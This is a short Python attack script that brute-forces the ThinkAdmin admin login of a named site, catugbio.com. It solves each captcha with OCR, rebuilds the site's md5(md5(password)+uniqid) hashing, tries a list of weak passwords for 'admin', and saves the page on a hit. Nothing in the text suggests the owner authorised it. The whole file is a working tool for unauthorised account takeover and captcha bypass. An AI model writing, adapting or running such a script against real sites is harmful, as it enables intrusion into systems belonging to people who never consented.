#!/usr/bin/env python3
"""catugbio ThinkAdmin full login: captcha OCR + md5 chain + weak pws"""
import urllib.request, urllib.parse, re, http.cookiejar, hashlib, json, base64, subprocess, sys

UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)", "Accept": "*/*"}
HOST = "http://catugbio.com"

def get_opener():
    cj = http.cookiejar.CookieJar()
    return urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj)), cj

def fetch(op, url, timeout=10, data=None, referer=None):
    h = {**UA}
    if data: h["Content-Type"] = "application/x-www-form-urlencoded"
    if referer: h["Referer"] = referer
    try:
        req = urllib.request.Request(url, data=data.encode() if data else None, headers=h)
        r = op.open(req, timeout=timeout)
        return r.status, r.read().decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, e.read(5000).decode("utf-8", "ignore")
    except Exception as ex:
        return 0, str(ex)

def ocr_img(img_bytes):
    b64 = base64.b64encode(img_bytes).decode()
    code = ("import ddddocr,base64; o=ddddocr.DdddOcr(show_ad=False); "
            "print(o.classification(base64.b64decode('%s')))" % b64)
    r = subprocess.run([sys.executable, "-c", code], capture_output=True, timeout=20, cwd="/tmp")
    return r.stdout.decode().strip()

def get_captcha(op):
    code, body = fetch(op, HOST + "/admin/login/captcha")
    try:
        j = json.loads(body)
        data = j["data"]
        uniqid = data["uniqid"]
        img_b64 = data["image"].split(",", 1)[1]
        return uniqid, base64.b64decode(img_b64)
    except Exception:
        return None, None

PWS = ["admin", "admin123", "123456", "admin888", "12345678", "a123456", "admin666", "123456789", "password"]

op, cj = get_opener()
code, body = fetch(op, HOST + "/admin/login.html")
print("login page: %s" % code, flush=True)

for pw in PWS:
    # fresh captcha per attempt
    uniqid, img = get_captcha(op)
    if not uniqid:
        print("captcha fail", flush=True)
        break
    verify = ocr_img(img)
    if not verify:
        print("  ocr fail, retry", flush=True)
        continue
    # md5(md5(pw) + uniqid)
    enc_pw = hashlib.md5((hashlib.md5(pw.encode()).hexdigest() + uniqid).encode()).hexdigest()
    data = urllib.parse.urlencode({"username": "admin", "password": enc_pw,
                                   "verify": verify, "uniqid": uniqid})
    code, body = fetch(op, HOST + "/admin/login.html", data=data, referer=HOST + "/admin/login.html")
    ok = '"code":1' in body or "退出" in body or "index/index" in body
    print("admin/%s: code=%s verify=%s ok=%s resp=%s" % (pw, code, verify, ok, body[:80]), flush=True)
    if ok:
        print("!!! HIT admin/%s" % pw, flush=True)
        open("/tmp/catug_hit.html", "w").write(body)
        break
